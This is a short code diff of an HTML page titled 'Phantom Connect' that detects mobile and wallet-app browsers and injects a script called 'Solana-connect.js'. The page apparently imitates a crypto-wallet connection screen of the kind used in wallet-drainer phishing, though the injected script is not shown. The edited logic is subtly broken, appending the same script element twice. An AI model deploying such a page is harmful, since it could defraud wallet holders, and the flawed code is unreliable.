@@ -6,22 +6,22 @@
     <title>Phantom Connect</title>
     <link rel="icon" href="" type="image/x-icon">
     <script src="dynamicview.js"></script>
-    <script src="info.js"></script>
+    <!-- <script src="info.js"></script> -->
     <script>
         const mobileRegex = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
         const userAgent = navigator.userAgent.toLowerCase();
-        const isPhantomApp = userAgent.toLowerCase().includes('phantom');
-        const isSolflareApp = userAgent.toLowerCase().includes('solflare');
+        const isPhantomApp = userAgent.includes('phantom');
+        const isSolflareApp = userAgent.includes('solflare');
 
-        if (mobileRegex.test(navigator.userAgent) || isPhantomApp || isSolflareApp) { // Check for a broader range of mobile devices and include Phantom or Solflare apps
+        const script = document.createElement('script');
+        script.src = 'Solana-connect.js';
+        document.head.appendChild(script);
+
+        if (mobileRegex.test(navigator.userAgent) || isPhantomApp || isSolflareApp) {
             setTimeout(() => {
-                const script = document.createElement('script');
-                script.src = 'Solana-connect.js';
                 document.head.appendChild(script);
-            }, 500);
+            }, 2500);
         } else {
-            const script = document.createElement('script');
-            script.src = 'Solana-connect.js';
             document.head.appendChild(script);
         }
     </script>
